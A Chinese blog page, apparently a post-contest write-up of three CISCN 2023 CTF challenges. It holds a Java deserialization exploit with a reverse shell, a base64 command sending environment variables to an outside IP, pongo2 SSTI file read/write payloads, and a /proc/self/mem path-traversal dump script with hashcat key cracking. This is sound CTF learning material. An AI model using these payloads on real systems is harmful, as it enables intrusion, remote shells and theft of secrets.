@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            ciscn2023初赛 赛后复现
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="DeserBug"><a href="#DeserBug" class="headerlink" title="DeserBug"></a>DeserBug</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次做（复现）比赛的java题，学到的东西很多。</p>
+<p>主要参考的是M1sery师傅的wp。CC之前一点没学过，为了看这题刚好就顺便学了。知道这题的链条怎么走之后，再自己写exp。然后被本地通远程不通卡了一下，再去了解一下java exec 的命令怎么写。最后打通远程靶机。</p>
+<p>M1sery 师傅的wp：<a target="_blank" rel="noopener" href="https://www.yuque.com/misery333/sz1apr/pu2fcu7s6bg10333">https://www.yuque.com/misery333/sz1apr/pu2fcu7s6bg10333</a></p>
+<p>CC链：<a target="_blank" rel="noopener" href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20220407-cc_analysis.html">https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20220407-cc_analysis.html</a></p>
+<p>java的exec：<a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a></p>
+<hr>
+<p>java exec 写法，直接放这里了，方便记住：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// base64 是要执行的命令</span><br><span class="line">Runtime.getRuntime.exec(&quot;bash -c &#123;echo,ZW52ID4gL2Rldi90Y3AvNjEuMTM5LjY1LjEzNC8zNjI2NAo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line"></span><br><span class="line">//反弹shell用这个</span><br><span class="line">Runtime.getRuntime.exec(&quot;/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/192.168.190.1/8989&lt;&amp;1“);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>链条：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap</span><br><span class="line">    -&gt;readObject()</span><br><span class="line">    -&gt;hash(key)</span><br><span class="line"></span><br><span class="line">TiedMapEntry</span><br><span class="line">    -&gt;hashCode()</span><br><span class="line">        -&gt;getValue()</span><br><span class="line">            -&gt;map.get(key)</span><br><span class="line">LazyMap</span><br><span class="line">    -&gt;get(key)</span><br><span class="line">    -&gt;this.map.put(key, value)</span><br><span class="line"></span><br><span class="line">JSONObject</span><br><span class="line">	-&gt;put(...,value)</span><br><span class="line">		-&gt;value.getter</span><br><span class="line">Myexpect</span><br><span class="line">	-&gt;getAnyexcept()</span><br><span class="line">		//这里可以调用可控类的可控参数的构造器</span><br><span class="line">		</span><br><span class="line">TrAXFilter</span><br><span class="line">    -&gt;TrAXFilter(templates)</span><br><span class="line">        -&gt;templates.newTransformer()</span><br><span class="line"></span><br><span class="line">TemplatesImpl</span><br><span class="line">    -&gt;newTransformer()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完整代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cn.hutool.json.JSONObject;</span><br><span class="line">import com.app.Myexpect;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import unknown.tools.GetTemplateImpl;</span><br><span class="line">import unknown.tools.MyMethods;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = GetTemplateImpl.GenerateTemplate(&quot;/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/192.168.190.1/8989&lt;&amp;1&quot;);</span><br><span class="line"></span><br><span class="line">        JSONObject json = new JSONObject();</span><br><span class="line">        Myexpect myexpect = new Myexpect();</span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypeparam(new Class[]&#123;Templates.class&#125;);</span><br><span class="line">        myexpect.setTypearg(new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(json,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;111&quot;);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">		//MyMethods是自己的写的工具类</span><br><span class="line">        MyMethods.setFieldValue(lazyMap,&quot;factory&quot;,new ConstantTransformer(myexpect));</span><br><span class="line"></span><br><span class="line">        System.out.println(MyMethods.base64(MyMethods.serialize(hashMap)));</span><br><span class="line"></span><br><span class="line">        //MyMethods.unserialize(Base64.getDecoder().decode(MyMethods.base64(MyMethods.serialize(hashMap))));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>赛后复现，最大的感受就是要读官方文档，而且要仔细读。</p>
+<p>复现这题时，已经知道了payload，但是想先自己试着找资料，看看payload是怎样来的，自己有无能力找出来。google关键词 pongo2 SSTI，但是基本搜不到现成的。官方文档我也不肯仔细读，随便翻翻，翻不到一眼看出有用的东西，所以基本没思路。</p>
+<p>问了下Lolita，他说他的payload是从文档里看来的，我就开始沉下心来仔细翻文档了，最后成功复现。</p>
+<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>题目源码：</p>
+<p>route.go （关于session的检测删去了）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package route</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="line">	&quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">	&quot;github.com/gorilla/sessions&quot;</span><br><span class="line">	&quot;html&quot;</span><br><span class="line">	&quot;io&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</span><br><span class="line"></span><br><span class="line">func Index(c *gin.Context) &#123;</span><br><span class="line">	session, err := store.Get(c.Request, &quot;session-name&quot;)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if session.Values[&quot;name&quot;] == nil &#123;</span><br><span class="line">		session.Values[&quot;name&quot;] = &quot;admin&quot;</span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(200, &quot;Hello, guest&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func Admin(c *gin.Context) &#123;</span><br><span class="line">	name := c.DefaultQuery(&quot;name&quot;, &quot;ssti&quot;)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	c.String(200, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func Flask(c *gin.Context) &#123;</span><br><span class="line">	session, err := store.Get(c.Request, &quot;session-name&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if session.Values[&quot;name&quot;] == nil &#123;</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;))</span><br><span class="line">	fmt.Println(c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;))</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(200, string(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>main.go</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">	&quot;main/route&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(&quot;/&quot;, route.Index)</span><br><span class="line">	r.GET(&quot;/admin&quot;, route.Admin)</span><br><span class="line">	r.GET(&quot;/flask&quot;, route.Flask)</span><br><span class="line">	r.Run(&quot;0.0.0.0:85&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>5000端口跑的app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">app.run(&#x27;0.0.0.0&#x27;,debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>做法是通过SSTI实现任意文件读写，然后覆盖app.py。由于app.py 开了debug，所以只要app.py文件内容发生改变，就会重新加载。目的就是自己写恶意的app.py，覆盖原来的。</p>
+<p>直接上SSTI的payload：</p>
+<p>读文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#两个都可</span><br><span class="line">&#123;%include c.Request.Referer()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%include c.Request.Host()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529221156470.png" alt="image-20230529221156470.png"></p>
+<p>写文件，覆盖app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529221309190.png" alt="image-20230529221309190.png"><br>此时访问&#x2F;shell可访问</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529221339639.png" alt="image-20230529221339639.png"></p>
+<h2 id="找payload过程"><a href="#找payload过程" class="headerlink" title="找payload过程"></a>找payload过程</h2><p>先看pongo2那里做了什么。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529221545283.png" alt="image-20230529221545283.png"><br>看到是把gin.Context那个变量传了进去。</p>
+<p>所以现在切入点是pongo2还有gin.Context。</p>
+<p>先看pongo2，翻文档。</p>
+<p>在这里要找到include。当然实际情况下不可能立刻找到，也可能一无所获，但还得仔细看。下面是找的过程。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214238150.png" alt="image-20230529214238150.png"><br>Django</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214353968.png" alt="image-20230529214353968.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214238150.png" alt="image-20230529214238150.png"><br>Django的文档</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214353968.png" alt="image-20230529214353968.png"><br>Tags</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214416857.png" alt="image-20230529214416857.png"><br>Built-in tag reference</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214522953.png" alt="image-20230529214522953.png"><br>include</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529214613887.png" alt="image-20230529214613887.png"></p>
+<p>上面的include可以读取文件，但现在要把文件名传进去，不能直接传引号的字符串，所以需要一个可控字符串变量。</p>
+<p>接下来翻gin的文档。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529222345643.png" alt="image-20230529222345643.png"><br>点进去Context</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529222528589.png" alt="image-20230529222528589.png"><br>Request</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529222811947.png" alt="image-20230529222811947.png"><br>找到Request的Host属性，可控。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529222632773.png" alt="image-20230529222632773.png"><br>Referer方法，返回字符串，可控。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529222839167.png" alt="image-20230529222839167.png"></p>
+<p>以上找是读取文件的payload，下面找写文件的payload。</p>
+<p>回到这里，下面都是Context的方法，一个个看哪个有用：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529223023099.png" alt="image-20230529223023099.png"><br>找到一个传文件的方法：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529223346785.png" alt="image-20230529223346785.png"><br>需要一个FileHeader，找到：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529223424578.png" alt="image-20230529223424578.png"><br>需要两个可控变量，一个给dst，一个给name，上面都找到了，这样写文件的payload也出来了。</p>
+<p>ps:这个FormFile返回值是两个值，payload直接写源码里编译不过，但是payload发过去能成功写，就很奇怪。我还是学得太少了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529223722641.png" alt="image-20230529223722641.png"></p>
+<h1 id="reading"><a href="#reading" class="headerlink" title="reading"></a>reading</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>队友Lolita做出来的，拿了一血，实在是佩服。内存里直接找secret_key不敢想，时间戳的爆破更不敢想。</p>
+<p>简单回顾他当时做的过程。这种配合start和end读内存的题目在好几个比赛都有见，所以看到这题第一反应就是去读内存了。他想着把全部内存读出来，然后找32位的字符串，那就是secret_key或者key。</p>
+<p>跑脚本10分钟，找到了两个32位字符串，在同一个文件，且在相邻行紧挨着。拿其中一个可以解session，那另一个就是key。他以为直接伪造就行了，没注意到&#x2F;flag里要把我们输入的再md5一次。注意到这点时候，感觉思路又断了，因为靶机已经开了两个小时了，时间戳根本不可能爆出来。</p>
+<p>刚好此时我开了另一个环境，想看看其他题，没想到reading的靶机自动关了。我感觉自己闯大祸：靶机要重开，secret_key要重爆。他也很烦，又要爆一次，然后他突然反应过来：开环境，刚好可以记时间戳！靶机开机时立刻打时间戳，就大大减小了爆破的难度。</p>
+<p>像第一次那样得到secret_key和key，然后跑hashcat，等了7、8分钟就看到Cracked了。激动的心，颤抖的手，交了flag，拿了一血。</p>
+<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import math</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">from flask import Flask, request, session, render_template, send_file</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = hashlib.md5(os.urandom(32)).hexdigest()</span><br><span class="line">key = hashlib.md5(str(time.time_ns()).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/books&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def book_page():</span><br><span class="line">    filepath = request.args.get(&#x27;book&#x27;)</span><br><span class="line">    if request.args.get(&#x27;page_size&#x27;):</span><br><span class="line">        page_size = int(request.args.get(&#x27;page_size&#x27;))</span><br><span class="line">    else:</span><br><span class="line">        page_size = 3000</span><br><span class="line">    if request.args.get(&#x27;page&#x27;):</span><br><span class="line">        page = int(request.args.get(&#x27;page&#x27;))</span><br><span class="line">    else:</span><br><span class="line">        page = 1</span><br><span class="line">    words = read_file_page(filepath, page, page_size)</span><br><span class="line">    return &#x27;\n&#x27;.join(words)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def flag():</span><br><span class="line">    if hashlib.md5(session.get(&#x27;key&#x27;).encode()).hexdigest() == key:</span><br><span class="line">        return &quot;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;no no no&quot;</span><br><span class="line"></span><br><span class="line">def read_file_page(filename, page_number, page_size):</span><br><span class="line">    for i in range(3):</span><br><span class="line">        for j in range(3):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - 1) * page_size+i</span><br><span class="line">            try:</span><br><span class="line">                with open(filename, &#x27;rb&#x27;) as file:</span><br><span class="line">                    file.seek(offset)</span><br><span class="line">                    words = file.read(size)</span><br><span class="line">                    return words.decode().split(&#x27;\n&#x27;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                pass</span><br><span class="line">            #if error again</span><br><span class="line">    offset = (page_number - 1) * page_size</span><br><span class="line">    with open(filename, &#x27;rb&#x27;) as file:</span><br><span class="line">        file.seek(offset)</span><br><span class="line">        words = file.read(page_size)</span><br><span class="line">        return words.split(b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>首先将maps的内容读出来，再根据这个来读取所有内存内容。</p>
+<p>读取mem的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests,time,re</span><br><span class="line"></span><br><span class="line">#maps里是读maps的原始内容</span><br><span class="line">maps = open(&#x27;maps&#x27;).read().split(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">start_end = []</span><br><span class="line">for line in maps:</span><br><span class="line">    if &#x27; r&#x27; not in line: #忽略不可读的内存</span><br><span class="line">        continue</span><br><span class="line">    line = line.split()[0]</span><br><span class="line">    start = line.split(&#x27;-&#x27;)[0]</span><br><span class="line">    end = line.split(&#x27;-&#x27;)[1]</span><br><span class="line">    start_end.append([start,end])</span><br><span class="line"></span><br><span class="line">page_size = 4096</span><br><span class="line">for i,line in enumerate(start_end):</span><br><span class="line">    start = int(line[0],16)</span><br><span class="line">    end = int(line[1],16)</span><br><span class="line"></span><br><span class="line">    # page_size = end-start 写了这条也可</span><br><span class="line"></span><br><span class="line">    start_page = start // page_size</span><br><span class="line">    page_num = (end-start)//page_size</span><br><span class="line">    print(f&#x27;[*]&#123;i + 1&#125;/&#123;len(start_end)&#125;&#x27;, &#x27;page_num: &#x27;,page_num)</span><br><span class="line">    result = open(f&#x27;my/&#123;line[0]&#125;-&#123;line[1]&#125;.bin&#x27;, &#x27;wb&#x27;)</span><br><span class="line"></span><br><span class="line">    for page in range(page_num):</span><br><span class="line">        url = f&#x27;http://192.168.190.130:5000/books?book=../../../../../../../proc/self/mem&amp;page=&#123;start_page+page&#125;&amp;page_size=&#123;page_size&#125;&#x27;</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        result.write(res.text.encode())</span><br><span class="line">        result.write(b&#x27;\n&#x27;)</span><br><span class="line">    result.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529141715963.png" alt="image-20230529141715963.png"><br>全局正则查找：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529141843497.png" alt="image-20230529141843497.png"></p>
+<p>得到两个靠的很近的32位字符串：</p>
+<p>ba8de28bc623af25efcb50f4e09ab750</p>
+<p>b33ff936a57adfeebbe317eb3f1e1e43</p>
+<p>猜测一个是secret_key，一个是key，拿其中一个去解session，可以解，那另一个就是key</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529142238207.png" alt="image-20230529142238207.png"><br>接下来要爆破时间戳。</p>
+<p>在程序运行（在比赛就是开靶机）时，立刻敲几个时间戳出来，这样前面几位数字是固定的，只需要爆破后面的数字。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529142425052.png" alt="image-20230529142425052.png"></p>
+<p>用hashcat: <code>hashcat -m 0 -a 3 b33ff936a57adfeebbe317eb3f1e1e43 168534084?d?d?d?d?d?d?d?d?d?d</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529143930990.png" alt="image-20230529143930990.png"><br>成功爆破。</p>
+<p>伪造session：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529143952516.png" alt="image-20230529143952516.png"><br>访问&#x2F;flag：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ciscn2023/image-20230529144008793.png" alt="image-20230529144008793.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DeserBug"><span class="toc-text">DeserBug</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#go-session"><span class="toc-text">go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BEpayload%E8%BF%87%E7%A8%8B"><span class="toc-text">找payload过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reading"><span class="toc-text">reading</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-2"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0"><span class="toc-text">开始复现</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
